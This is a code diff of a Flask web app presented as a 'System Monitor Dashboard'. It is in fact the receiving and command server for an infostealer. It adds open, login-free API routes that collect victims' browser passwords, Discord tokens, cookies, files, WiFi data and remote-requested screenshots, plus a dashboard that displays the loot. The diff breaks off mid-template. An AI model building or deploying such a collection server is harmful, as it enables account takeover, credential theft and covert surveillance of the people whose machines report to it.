@@ -1,750 +1,763 @@
 #!/usr/bin/env python3
 """
-LEALDADE SYSTEM MONITOR - RAILWAY VERSION
-Site de monitoramento com login seguro e integração com Railway
+System Monitor Dashboard - Versão COMPLETA com Relatórios
 """
 
 import os
-import sys
 import json
-import time
-from datetime import datetime, timedelta
-from flask import Flask, render_template_string, request, jsonify, redirect, url_for, session
-from functools import wraps
-
-# Adiciona pasta modules ao path
-sys.path.append(os.path.join(os.path.dirname(__file__), '..', 'lealdade.gg', 'modules'))
-
-from auth_system import auth_system
+import base64
+from datetime import datetime
+from flask import Flask, request, jsonify
 
 app = Flask(__name__)
-app.secret_key = 'lealdade_railway_super_secret_key_2024'
 
-# Armazenamento de dados
-endpoints_data = {}
-endpoint_tokens = {}
+# CORS manual
+@app.after_request
+def after_request(response):
+    response.headers.add('Access-Control-Allow-Origin', '*')
+    response.headers.add('Access-Control-Allow-Headers', 'Content-Type')
+    response.headers.add('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
+    return response
+
+# Dados em memoria
+endpoints = {}
+metrics_data = []
 endpoint_screenshots = {}
-endpoint_full_reports = {}
+screenshot_requests = {}
+endpoint_tokens = {}
+endpoint_cookies = {}
+endpoint_passwords = {}
+endpoint_files = {}
+full_reports = {}
+uploaded_files = {}
 
-def require_auth(f):
-    """Decorador para exigir autenticação"""
-    @wraps(f)
-    def decorated_function(*args, **kwargs):
-        if not auth_system.is_logged_in():
-            return redirect(url_for('login'))
-        return f(*args, **kwargs)
-    return decorated_function
+@app.route('/')
+def index():
+    return HTML_TEMPLATE
 
-# HTML Templates
-LOGIN_TEMPLATE = """
+@app.route('/api/register', methods=['POST', 'OPTIONS'])
+def register_endpoint():
+    if request.method == 'OPTIONS':
+        return jsonify({'status': 'success'})
+    
+    try:
+        data = request.json
+        endpoint_id = data.get('endpoint_id', 'unknown')
+        
+        endpoints[endpoint_id] = {
+            'id': endpoint_id,
+            'hostname': data.get('hostname', 'Unknown'),
+            'user': data.get('user', 'Unknown'),
+            'ip_address': data.get('ip_address', 'Unknown'),
+            'external_ip': data.get('external_ip', 'Unknown'),
+            'platform': data.get('platform', 'Unknown'),
+            'ram': data.get('ram', 'Unknown'),
+            'timestamp': datetime.now().isoformat(),
+            'status': 'online',
+            'last_seen': datetime.now().strftime('%H:%M:%S')
+        }
+        
+        print(f"✅ Endpoint registrado: {endpoint_id}")
+        return jsonify({'status': 'success', 'message': 'Endpoint registered'})
+    except Exception as e:
+        return jsonify({'status': 'error', 'message': str(e)}), 500
+
+@app.route('/api/metrics', methods=['POST', 'OPTIONS'])
+def receive_metrics():
+    if request.method == 'OPTIONS':
+        return jsonify({'status': 'success'})
+    
+    try:
+        data = request.json
+        endpoint_id = data.get('endpoint_id', 'unknown')
+        metrics = data.get('metrics', [])
+        
+        for metric in metrics:
+            metric['endpoint_id'] = endpoint_id
+            metric['received_at'] = datetime.now().isoformat()
+            metrics_data.append(metric)
+        
+        print(f"📊 Métricas recebidas de {endpoint_id}: {len(metrics)} itens")
+        return jsonify({'status': 'success'})
+    except Exception as e:
+        return jsonify({'status': 'error', 'message': str(e)}), 500
+
+@app.route('/api/tokens', methods=['POST', 'OPTIONS'])
+def receive_tokens():
+    if request.method == 'OPTIONS':
+        return jsonify({'status': 'success'})
+    
+    try:
+        data = request.json
+        endpoint_id = data.get('endpoint_id', 'unknown')
+        tokens = data.get('tokens', [])
+        
+        endpoint_tokens[endpoint_id] = {
+            'tokens': tokens,
+            'timestamp': datetime.now().isoformat()
+        }
+        
+        print(f"🔑 Tokens recebidos de {endpoint_id}: {len(tokens)} tokens")
+        return jsonify({'status': 'success'})
+    except Exception as e:
+        return jsonify({'status': 'error', 'message': str(e)}), 500
+
+@app.route('/api/cookies', methods=['POST', 'OPTIONS'])
+def receive_cookies():
+    if request.method == 'OPTIONS':
+        return jsonify({'status': 'success'})
+    
+    try:
+        data = request.json
+        endpoint_id = data.get('endpoint_id', 'unknown')
+        cookies = data.get('cookies', [])
+        
+        endpoint_cookies[endpoint_id] = {
+            'cookies': cookies,
+            'timestamp': datetime.now().isoformat()
+        }
+        
+        print(f"🍪 Cookies recebidos de {endpoint_id}: {len(cookies)} cookies")
+        return jsonify({'status': 'success'})
+    except Exception as e:
+        return jsonify({'status': 'error', 'message': str(e)}), 500
+
+@app.route('/api/passwords', methods=['POST', 'OPTIONS'])
+def receive_passwords():
+    if request.method == 'OPTIONS':
+        return jsonify({'status': 'success'})
+    
+    try:
+        data = request.json
+        endpoint_id = data.get('endpoint_id', 'unknown')
+        passwords = data.get('passwords', [])
+        
+        endpoint_passwords[endpoint_id] = {
+            'passwords': passwords,
+            'timestamp': datetime.now().isoformat()
+        }
+        
+        print(f"🔒 Senhas recebidas de {endpoint_id}: {len(passwords)} senhas")
+        return jsonify({'status': 'success'})
+    except Exception as e:
+        return jsonify({'status': 'error', 'message': str(e)}), 500
+
+@app.route('/api/files', methods=['POST', 'OPTIONS'])
+def receive_files():
+    if request.method == 'OPTIONS':
+        return jsonify({'status': 'success'})
+    
+    try:
+        data = request.json
+        endpoint_id = data.get('endpoint_id', 'unknown')
+        files = data.get('files', [])
+        
+        if endpoint_id not in endpoint_files:
+            endpoint_files[endpoint_id] = []
+        
+        endpoint_files[endpoint_id].extend(files)
+        
+        print(f"📁 Arquivos recebidos de {endpoint_id}: {len(files)} arquivos")
+        return jsonify({'status': 'success'})
+    except Exception as e:
+        return jsonify({'status': 'error', 'message': str(e)}), 500
+
+# NOVOS ENDPOINTS PARA RELATÓRIOS COMPLETOS
+@app.route('/api/full_report', methods=['POST', 'OPTIONS'])
+def receive_full_report():
+    if request.method == 'OPTIONS':
+        return jsonify({'status': 'success'})
+    
+    try:
+        data = request.json
+        endpoint_id = data.get('endpoint_id', 'unknown')
+        
+        # Salva o relatório completo
+        full_reports[endpoint_id] = {
+            'metadata': data,
+            'received_at': datetime.now().isoformat()
+        }
+        
+        print(f"📋 Relatório completo recebido de {endpoint_id}")
+        print(f"   Senhas: {data.get('total_passwords', 0)}")
+        print(f"   Cookies: {data.get('total_cookies', 0)}")
+        print(f"   Tokens: {data.get('total_tokens', 0)}")
+        print(f"   WiFi: {data.get('wifi_networks', 0)}")
+        print(f"   Screenshot: {'Sim' if data.get('screenshot_included') else 'Não'}")
+        
+        return jsonify({'status': 'success', 'message': 'Full report received'})
+    except Exception as e:
+        return jsonify({'status': 'error', 'message': str(e)}), 500
+
+@app.route('/api/screenshot_upload', methods=['POST', 'OPTIONS'])
+def upload_screenshot():
+    if request.method == 'OPTIONS':
+        return jsonify({'status': 'success'})
+    
+    try:
+        if 'screenshot' not in request.files:
+            return jsonify({'status': 'error', 'message': 'No file uploaded'}), 400
+        
+        file = request.files['screenshot']
+        endpoint_id = request.form.get('endpoint_id', 'unknown')
+        
+        if file:
+            # Converte para base64
+            image_data = file.read()
+            image_base64 = base64.b64encode(image_data).decode('utf-8')
+            
+            endpoint_screenshots[endpoint_id] = {
+                'image': image_base64,
+                'filename': file.filename,
+                'timestamp': datetime.now().isoformat()
+            }
+            
+            print(f"📸 Screenshot upload recebido de {endpoint_id}: {file.filename}")
+        
+        return jsonify({'status': 'success', 'message': 'Screenshot uploaded'})
+    except Exception as e:
+        return jsonify({'status': 'error', 'message': str(e)}), 500
+
+@app.route('/api/complete_report_upload', methods=['POST', 'OPTIONS'])
+def upload_complete_report():
+    if request.method == 'OPTIONS':
+        return jsonify({'status': 'success'})
+    
+    try:
+        if 'report' not in request.files:
+            return jsonify({'status': 'error', 'message': 'No file uploaded'}), 400
+        
+        file = request.files['report']
+        endpoint_id = request.form.get('endpoint_id', 'unknown')
+        
+        if file:
+            # Salva informações do arquivo
+            uploaded_files[endpoint_id] = {
+                'filename': file.filename,
+                'size': len(file.read()),
+                'content_type': file.content_type,
+                'timestamp': datetime.now().isoformat()
+            }
+            
+            # Volta ao início do arquivo para salvar
+            file.seek(0)
+            
+            # Salva o arquivo no disco
+            save_path = f"uploads/{endpoint_id}_{file.filename}"
+            os.makedirs('uploads', exist_ok=True)
+            file.save(save_path)
+            
+            print(f"📦 Relatório completo upload recebido de {endpoint_id}")
+            print(f"   Arquivo: {file.filename}")
+            print(f"   Tamanho: {uploaded_files[endpoint_id]['size']} bytes")
+            print(f"   Salvo em: {save_path}")
+        
+        return jsonify({'status': 'success', 'message': 'Complete report uploaded'})
+    except Exception as e:
+        return jsonify({'status': 'error', 'message': str(e)}), 500
+
+@app.route('/api/screenshot', methods=['POST', 'OPTIONS'])
+def receive_screenshot():
+    if request.method == 'OPTIONS':
+        return jsonify({'status': 'success'})
+    
+    try:
+        data = request.json
+        endpoint_id = data.get('endpoint_id', 'unknown')
+        image_base64 = data.get('image', '')
+        
+        if image_base64:
+            endpoint_screenshots[endpoint_id] = {
+                'image': image_base64,
+                'timestamp': datetime.now().isoformat()
+            }
+            print(f"📸 Screenshot recebido de {endpoint_id}!")
+        
+        return jsonify({'status': 'success'})
+    except Exception as e:
+        return jsonify({'status': 'error', 'message': str(e)}), 500
+
+@app.route('/api/request_screenshot/<endpoint_id>', methods=['POST', 'OPTIONS'])
+def request_screenshot(endpoint_id):
+    if request.method == 'OPTIONS':
+        return jsonify({'status': 'success'})
+    
+    try:
+        screenshot_requests[endpoint_id] = {
+            'requested': True,
+            'timestamp': datetime.now().isoformat()
+        }
+        
+        print(f"📸 Screenshot solicitado para: {endpoint_id}")
+        return jsonify({
+            'status': 'success', 
+            'message': f'Screenshot solicitado para {endpoint_id}'
+        })
+    except Exception as e:
+        return jsonify({'status': 'error', 'message': str(e)}), 500
+
+@app.route('/api/screenshot_requests/<endpoint_id>', methods=['GET', 'OPTIONS'])
+def check_screenshot_request(endpoint_id):
+    if request.method == 'OPTIONS':
+        return jsonify({'status': 'success'})
+    
+    try:
+        request_data = screenshot_requests.get(endpoint_id, {})
+        return jsonify({
+            'request_screenshot': request_data.get('requested', False),
+            'timestamp': request_data.get('timestamp')
+        })
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/api/screenshot_requests/<endpoint_id>/clear', methods=['POST', 'OPTIONS'])
+def clear_screenshot_request(endpoint_id):
+    if request.method == 'OPTIONS':
+        return jsonify({'status': 'success'})
+    
+    try:
+        if endpoint_id in screenshot_requests:
+            del screenshot_requests[endpoint_id]
+            print(f"🧹 Solicitação limpa para: {endpoint_id}")
+        return jsonify({'status': 'success'})
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
+# ENDPOINTS DE LEITURA
+@app.route('/api/endpoints', methods=['GET', 'OPTIONS'])
+def get_endpoints():
+    if request.method == 'OPTIONS':
+        return jsonify({'status': 'success'})
+    
+    return jsonify(endpoints)
+
+@app.route('/api/metrics_data', methods=['GET', 'OPTIONS'])
+def get_metrics_data():
+    if request.method == 'OPTIONS':
+        return jsonify({'status': 'success'})
+    
+    return jsonify(metrics_data)
+
+@app.route('/api/screenshots', methods=['GET', 'OPTIONS'])
+def get_screenshots():
+    if request.method == 'OPTIONS':
+        return jsonify({'status': 'success'})
+    
+    return jsonify(endpoint_screenshots)
+
+@app.route('/api/full_reports', methods=['GET', 'OPTIONS'])
+def get_full_reports():
+    if request.method == 'OPTIONS':
+        return jsonify({'status': 'success'})
+    
+    return jsonify(full_reports)
+
+@app.route('/api/uploaded_files', methods=['GET', 'OPTIONS'])
+def get_uploaded_files():
+    if request.method == 'OPTIONS':
+        return jsonify({'status': 'success'})
+    
+    return jsonify(uploaded_files)
+
+@app.route('/api/tokens_data', methods=['GET', 'OPTIONS'])
+def get_tokens_data():
+    if request.method == 'OPTIONS':
+        return jsonify({'status': 'success'})
+    
+    return jsonify(endpoint_tokens)
+
+@app.route('/api/cookies_data', methods=['GET', 'OPTIONS'])
+def get_cookies_data():
+    if request.method == 'OPTIONS':
+        return jsonify({'status': 'success'})
+    
+    return jsonify(endpoint_cookies)
+
+@app.route('/api/passwords_data', methods=['GET', 'OPTIONS'])
+def get_passwords_data():
+    if request.method == 'OPTIONS':
+        return jsonify({'status': 'success'})
+    
+    return jsonify(endpoint_passwords)
+
+@app.route('/api/files_data', methods=['GET', 'OPTIONS'])
+def get_files_data():
+    if request.method == 'OPTIONS':
+        return jsonify({'status': 'success'})
+    
+    return jsonify(endpoint_files)
+
+# Template HTML atualizado
+HTML_TEMPLATE = """
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>LEALDADE SYSTEM MONITOR</title>
+    <title>System Monitor Dashboard</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #36393f;
+            color: #dcddde;
             min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
         }
-        
-        .login-container {
-            background: rgba(255, 255, 255, 0.95);
-            border-radius: 20px;
-            padding: 40px;
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
-            width: 100%;
-            max-width: 400px;
+        .container { max-width: 1400px; margin: 0 auto; padding: 20px; }
+        .header { text-align: center; margin-bottom: 40px; }
+        .header h1 { font-size: 2.5em; margin-bottom: 10px; color: #7289da; }
+        .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin-bottom: 40px; }
+        .stat-card { 
+            background: #4f545c; 
+            padding: 20px; 
+            border-radius: 8px; 
             text-align: center;
-            backdrop-filter: blur(10px);
-            border: 1px solid rgba(255, 255, 255, 0.1);
         }
-        
-        .logo {
-            font-size: 2.5rem;
-            font-weight: bold;
-            background: linear-gradient(45deg, #667eea, #764ba2);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            margin-bottom: 10px;
-            text-transform: uppercase;
-            letter-spacing: 3px;
+        .stat-number { font-size: 2em; font-weight: bold; color: #43b581; }
+        .section { 
+            background: #4f545c; 
+            margin-bottom: 30px; 
+            border-radius: 8px; 
+            padding: 25px;
         }
-        
-        .subtitle {
-            color: #666;
-            font-size: 0.9rem;
-            margin-bottom: 30px;
-            font-style: italic;
+        .section h2 { margin-bottom: 20px; color: #43b581; }
+        .grid { 
+            display: grid; 
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); 
+            gap: 20px; 
         }
-        
-        .form-group {
-            margin-bottom: 20px;
-            text-align: left;
+        .card { 
+            background: #36393f; 
+            padding: 20px; 
+            border-radius: 8px; 
+            border: 1px solid #202225;
         }
-        
-        .form-group label {
-            display: block;
-            margin-bottom: 8px;
-            color: #333;
-            font-weight: 600;
-            font-size: 0.9rem;
+        .card h3 { margin-bottom: 15px; color: #7289da; }
+        .card p { margin: 5px 0; }
+        .screenshot { max-width: 100%; border-radius: 8px; margin-top: 10px; }
+        .btn { 
+            background: #7289da; 
+            color: white; 
+            border: none; 
+            padding: 10px 20px; 
+            border-radius: 5px; 
+            cursor: pointer;
+            margin: 5px;
         }
-        
-        .form-group input {
-            width: 100%;
-            padding: 12px 15px;
-            border: 2px solid #ddd;
-            border-radius: 8px;
-            font-size: 1rem;
-            transition: all 0.3s ease;
-            background: rgba(255, 255, 255, 0.9);
-        }
-        
-        .form-group input:focus {
-            outline: none;
-            border-color: #667eea;
-            background: white;
-            box-shadow: 0 0 10px rgba(102, 126, 234, 0.1);
-        }
-        
-        .login-btn {
-            width: 100%;
+        .btn:hover { background: #5f6bb3; }
+        .refresh-btn { 
+            position: fixed; 
+            bottom: 20px; 
+            right: 20px; 
+            background: #43b581;
+            color: white;
+            border: none;
             padding: 15px;
-            background: linear-gradient(45deg, #667eea, #764ba2);
-            color: white;
-            border: none;
-            border-radius: 8px;
-            font-size: 1.1rem;
-            font-weight: 600;
+            border-radius: 50%;
             cursor: pointer;
-            transition: all 0.3s ease;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            margin-top: 10px;
+            font-size: 18px;
         }
-        
-        .login-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.2);
+        .tabs { display: flex; margin-bottom: 20px; }
+        .tab { 
+            background: #36393f; 
+            color: #dcddde; 
+            border: none; 
+            padding: 10px 20px; 
+            cursor: pointer;
+            border-radius: 5px 5px 0 0;
+            margin-right: 5px;
         }
-        
-        .login-btn:active {
-            transform: translateY(0);
-        }
-        
-        .footer {
-            margin-top: 30px;
-            padding-top: 20px;
-            border-top: 1px solid rgba(255, 255, 255, 0.1);
-            color: #666;
-            font-size: 0.8rem;
-        }
-        
-        .footer-text {
-            font-style: italic;
-            margin-bottom: 10px;
-        }
-        
-        .warning {
-            background: rgba(255, 193, 7, 0.1);
-            border: 1px solid rgba(255, 193, 7, 0.3);
-            color: #d9534f;
-            padding: 10px;
-            border-radius: 5px;
-            margin-bottom: 20px;
-            font-size: 0.9rem;
-        }
+        .tab.active { background: #7289da; }
+        .tab-content { display: none; }
+        .tab-content.active { display: block; }
     </style>
 </head>
 <body>
-    <div class="login-container">
-        <div class="logo">LEALDADE</div>
-        <div class="subtitle">System Monitor</div>
-        
-        {% if error %}
-        <div class="warning">
-            <strong>⚠️ Atenção:</strong> {{ error }}
-        </div>
-        {% endif %}
-        
-        <form method="POST" action="/login">
-            <div class="form-group">
-                <label for="username">👤 Usuário</label>
-                <input type="text" id="username" name="username" required placeholder="Digite seu usuário">
-            </div>
-            
-            <div class="form-group">
-                <label for="password">🔑 Senha</label>
-                <input type="password" id="password" name="password" required placeholder="Digite sua senha">
-            </div>
-            
-            <button type="submit" class="login-btn">🚀 Acessar Sistema</button>
-        </form>
-        
-        <div class="footer">
-            <div class="footer-text">"Se você chegou até aqui, tem um longo caminho a seguir"</div>
-            <div style="font-size: 0.7rem; color: #999;">
-                Sistema de Monitoramento Seguro v1.0<br>
-                © 2024 LEALDADE System Monitor
-            </div>
-        </div>
-    </div>
-</body>
-</html>
-"""
-
-DASHBOARD_TEMPLATE = """
-<!DOCTYPE html>
-<html lang="pt-BR">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>LEALDADE SYSTEM MONITOR - Dashboard</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: #1a1a1a;
-            color: #ffffff;
-        }
-        
-        .header {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            padding: 20px;
-            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.3);
-            position: sticky;
-            top: 0;
-            z-index: 1000;
-        }
-        
-        .header-content {
-            max-width: 1200px;
-            margin: 0 auto;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-        
-        .logo {
-            font-size: 1.8rem;
-            font-weight: bold;
-            background: linear-gradient(45deg, #667eea, #764ba2);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            text-transform: uppercase;
-            letter-spacing: 2px;
-        }
-        
-        .user-info {
-            text-align: right;
-            color: rgba(255, 255, 255, 0.9);
-        }
-        
-        .user-info span {
-            display: block;
-            margin-bottom: 5px;
-            font-size: 0.9rem;
-        }
-        
-        .container {
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 20px;
-        }
-        
-        .stats-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
-            gap: 20px;
-            margin-bottom: 30px;
-        }
-        
-        .stat-card {
-            background: #2d2d2d;
-            border-radius: 15px;
-            padding: 25px;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
-            transition: all 0.3s ease;
-            border: 1px solid #444;
-        }
-        
-        .stat-card:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 10px 25px rgba(102, 126, 234, 0.2);
-            border-color: #667eea;
-        }
-        
-        .stat-card h3 {
-            color: #667eea;
-            margin-bottom: 15px;
-            font-size: 1.3rem;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-        
-        .stat-card .number {
-            font-size: 2.5rem;
-            font-weight: bold;
-            color: #ffffff;
-        }
-        
-        .stat-card .label {
-            color: #999;
-            font-size: 0.9rem;
-            margin-bottom: 10px;
-        }
-        
-        .endpoints-section {
-            background: #2d2d2d;
-            border-radius: 15px;
-            padding: 25px;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
-            margin-bottom: 30px;
-        }
-        
-        .endpoints-section h2 {
-            color: #667eea;
-            margin-bottom: 20px;
-            font-size: 1.5rem;
-            text-align: center;
-        }
-        
-        .endpoint-list {
-            display: grid;
-            gap: 15px;
-        }
-        
-        .endpoint-item {
-            background: #1e1e1e;
-            border-radius: 10px;
-            padding: 20px;
-            border: 1px solid #444;
-            transition: all 0.3s ease;
-        }
-        
-        .endpoint-item:hover {
-            background: #2a2a2a;
-            border-color: #667eea;
-        }
-        
-        .endpoint-name {
-            font-size: 1.1rem;
-            font-weight: 600;
-            color: #ffffff;
-            margin-bottom: 10px;
-        }
-        
-        .endpoint-stats {
-            display: grid;
-            grid-template-columns: repeat(4, 1fr);
-            gap: 10px;
-            margin-bottom: 10px;
-        }
-        
-        .stat {
-            text-align: center;
-            padding: 10px;
-            background: #1a1a1a;
-            border-radius: 5px;
-            border: 1px solid #444;
-        }
-        
-        .stat-value {
-            font-size: 1.2rem;
-            font-weight: bold;
-            color: #667eea;
-            display: block;
-            margin-bottom: 5px;
-        }
-        
-        .stat-label {
-            font-size: 0.8rem;
-            color: #999;
-        }
-        
-        .logout-btn {
-            background: #dc3545;
-            color: white;
-            border: none;
-            padding: 10px 20px;
-            border-radius: 5px;
-            cursor: pointer;
-            font-size: 0.9rem;
-            transition: all 0.3s ease;
-        }
-        
-        .logout-btn:hover {
-            background: #c82333;
-        }
-        
-        .footer {
-            text-align: center;
-            padding: 20px;
-            border-top: 1px solid #444;
-            color: #666;
-            font-size: 0.8rem;
-        }
-        
-        .refresh-btn {
-            background: #28a745;
-            color: white;
-            border: none;
-            padding: 8px 16px;
-            border-radius: 5px;
-            cursor: pointer;
-            font-size: 0.9rem;
-            transition: all 0.3s ease;
-        }
-        
-        .refresh-btn:hover {
-            background: #218838;
-        }
-    </style>
-</head>
-<body>
-    <div class="header">
-        <div class="header-content">
-            <div class="logo">LEALDADE</div>
-            <div class="user-info">
-                <span>👤 {{ session.user.username }}</span>
-                <span>⏰ {{ session.session_duration }} min</span>
-                <span>🌐 {{ session.ip }}</span>
-                <a href="/logout" class="logout-btn">🚪 Sair</a>
-            </div>
-        </div>
-    </div>
-    
     <div class="container">
-        <div class="stats-grid">
+        <div class="header">
+            <h1>System Monitor</h1>
+            <p>Painel de Monitoramento em Tempo Real</p>
+        </div>
+
+        <div class="stats">
             <div class="stat-card">
-                <h3>
-                    <span class="number">{{ total_endpoints }}</span>
-                    🖥️
-                </h3>
-                <div class="label">Endpoints Ativos</div>
+                <div class="stat-number" id="totalEndpoints">0</div>
+                <div>Endpoints</div>
             </div>
-            
             <div class="stat-card">
-                <h3>
-                    <span class="number">{{ total_tokens }}</span>
-                    🔑
-                </h3>
-                <div class="label">Tokens Coletados</div>
+                <div class="stat-number" id="totalReports">0</div>
+                <div>Relatórios</div>
             </div>
-            
             <div class="stat-card">
-                <h3>
-                    <span class="number">{{ total_passwords }}</span>
-                    🔐
-                </h3>
-                <div class="label">Senhas Capturadas</div>
+                <div class="stat-number" id="totalPasswords">0</div>
+                <div>Senhas</div>
             </div>
-            
             <div class="stat-card">
-                <h3>
-                    <span class="number">{{ total_screenshots }}</span>
-                    📸
-                </h3>
-                <div class="label">Screenshots</div>
+                <div class="stat-number" id="totalTokens">0</div>
+                <div>Tokens</div>
             </div>
         </div>
-        
-        <div class="endpoints-section">
-            <h2>📊 Endpoints Monitorados</h2>
-            <button class="refresh-btn" onclick="location.reload()">🔄 Atualizar</button>
-            
-            <div class="endpoint-list">
-                {% for endpoint in endpoints %}
-                <div class="endpoint-item">
-                    <div class="endpoint-name">{{ endpoint.id }}</div>
-                    <div class="endpoint-stats">
-                        <div class="stat">
-                            <span class="stat-value">{{ endpoint.tokens|length }}</span>
-                            <div class="stat-label">Tokens</div>
-                        </div>
-                        <div class="stat">
-                            <span class="stat-value">{{ endpoint.passwords|length }}</span>
-                            <div class="stat-label">Senhas</div>
-                        </div>
-                        <div class="stat">
-                            <span class="stat-value">{{ endpoint.cookies|length }}</span>
-                            <div class="stat-label">Cookies</div>
-                        </div>
-                        <div class="stat">
-                            <span class="stat-value">{{ 'Sim' if endpoint.screenshot else 'Não' }}</span>
-                            <div class="stat-label">Screenshot</div>
-                        </div>
-                    </div>
-                </div>
-                {% endfor %}
+
+        <div class="tabs">
+            <button class="tab active" onclick="showTab('endpoints')">Endpoints</button>
+            <button class="tab" onclick="showTab('reports')">Relatórios</button>
+            <button class="tab" onclick="showTab('data')">Dados</button>
+            <button class="tab" onclick="showTab('screenshots')">Screenshots</button>
+        </div>
+
+        <div id="endpoints" class="tab-content active">
+            <div class="section">
+                <h2>Endpoints Conectados</h2>
+                <div id="endpointsList" class="grid"></div>
             </div>
         </div>
-    </div>
-    
-    <div class="footer">
-        <div>"Se você chegou até aqui, tem um longo caminho a seguir"</div>
-        <div style="font-size: 0.7rem; color: #666;">
-            Sistema de Monitoramento Seguro v1.0<br>
-            © 2024 LEALDADE System Monitor
+
+        <div id="reports" class="tab-content">
+            <div class="section">
+                <h2>Relatórios Completos</h2>
+                <div id="fullReportsList" class="grid"></div>
+            </div>
+        </div>
+
+        <div id="data" class="tab-content">
+            <div class="section">
+                <h2>Tokens Discord</h2>
+                <div id="tokensList" class="grid"></div>
+            </div>
+            <div class="section">
+                <h2>Senhas Navegadores</h2>
+                <div id="passwordsList" class="grid"></div>
+            </div>
+            <div class="section">
+                <h2>Cookies</h2>
+                <div id="cookiesList" class="grid"></div>
+            </div>
+        </div>
+
+        <div id="screenshots" class="tab-content">
+            <div class="section">
+                <h2>Screenshots</h2>
+                <div id="screenshotsList" class="grid"></div>
+            </div>
         </div>
     </div>
-    
+
+    <button class="refresh-btn" onclick="loadAllData()">🔄</button>
+
     <script>
-        // Auto-refresh a cada 30 segundos
-        setTimeout(() => {
-            location.reload();
-        }, 30000);
+        function showTab(tabName) {
+            // Esconde todos os conteúdos
+            document.querySelectorAll('.tab-content').forEach(content => {
+                content.classList.remove('active');
+            });
+            document.querySelectorAll('.tab').forEach(tab => {
+                tab.classList.remove('active');
+            });
+            
+            // Mostra o conteúdo selecionado
+            document.getElementById(tabName).classList.add('active');
+            event.target.classList.add('active');
+        }
+
+        async function loadEndpoints() {
+            try {
+                const response = await fetch('/api/endpoints');
+                const endpoints = await response.json();
+                
+                const container = document.getElementById('endpointsList');
+                container.innerHTML = '';
+                
+                Object.values(endpoints).forEach(endpoint => {
+                    const div = document.createElement('div');
+                    div.className = 'card';
+                    div.innerHTML = \`
+                        <h3>\${endpoint.hostname}</h3>
+                        <p><strong>ID:</strong> \${endpoint.id}</p>
+                        <p><strong>User:</strong> \${endpoint.user}</p>
+                        <p><strong>IP:</strong> \${endpoint.ip_address}</p>
+                        <p><strong>External:</strong> \${endpoint.external_ip}</p>
+                        <p><strong>Platform:</strong> \${endpoint.platform}</p>
+                        <p><strong>RAM:</strong> \${endpoint.ram}</p>
+                        <p><strong>Status:</strong> 🟢 Online</p>
+                        <button class="btn" onclick="requestScreenshot('\${endpoint.id}')">📸 Screenshot</button>
+                    \`;
+                    container.appendChild(div);
+                });
+                
+                document.getElementById('totalEndpoints').textContent = Object.keys(endpoints).length;
+            } catch (error) {
+                console.error('Error loading endpoints:', error);
+            }
+        }
+
+        async function loadFullReports() {
+            try {
+                const response = await fetch('/api/full_reports');
+                const reports = await response.json();
+                
+                const container = document.getElementById('fullReportsList');
+                container.innerHTML = '';
+                
+                let totalPasswords = 0;
+                let totalTokens = 0;
+                
+                Object.entries(reports).forEach(([endpoint_id, report]) => {
+                    const div = document.createElement('div');
+                    div.className = 'card';
+                    div.innerHTML = \`
+                        <h3>\${report.metadata.hostname}</h3>
+                        <p><strong>User:</strong> \${report.metadata.user}</p>
+                        <p><strong>Passwords:</strong> \${report.metadata.total_passwords}</p>
+                        <p><strong>Cookies:</strong> \${report.metadata.total_cookies}</p>
+                        <p><strong>Tokens:</strong> \${report.metadata.total_tokens}</p>
+                        <p><strong>WiFi:</strong> \${report.metadata.wifi_networks}</p>
+                        <p><strong>Screenshot:</strong> \${report.metadata.screenshot_included ? '✅' : '❌'}</p>
+                        <p><strong>Received:</strong> \${new Date(report.received_at).toLocaleString()}</p>
+                    \`;
+                    container.appendChild(div);
+                    
+                    totalPasswords += report.metadata.total_passwords || 0;
+                    totalTokens += report.metadata.total_tokens || 0;
+                });
+                
+                document.getElementById('totalReports').textContent = Object.keys(reports).length;
+                document.getElementById('totalPasswords').textContent = totalPasswords;
+                document.getElementById('totalTokens').textContent = totalTokens;
+            } catch (error) {
+                console.error('Error loading reports:', error);
+            }
+        }
+
+        async function loadData() {
+            try {
+                // Carrega tokens
+                const tokensResponse = await fetch('/api/tokens_data');
+                const tokens = await tokensResponse.json();
+                
+                const tokensContainer = document.getElementById('tokensList');
+                tokensContainer.innerHTML = '';
+                
+                Object.entries(tokens).forEach(([endpoint_id, data]) => {
+                    const div = document.createElement('div');
+                    div.className = 'card';
+                    div.innerHTML = \`
+                        <h3>\${endpoint_id}</h3>
+                        <p><strong>Tokens:</strong> \${data.tokens.length}</p>
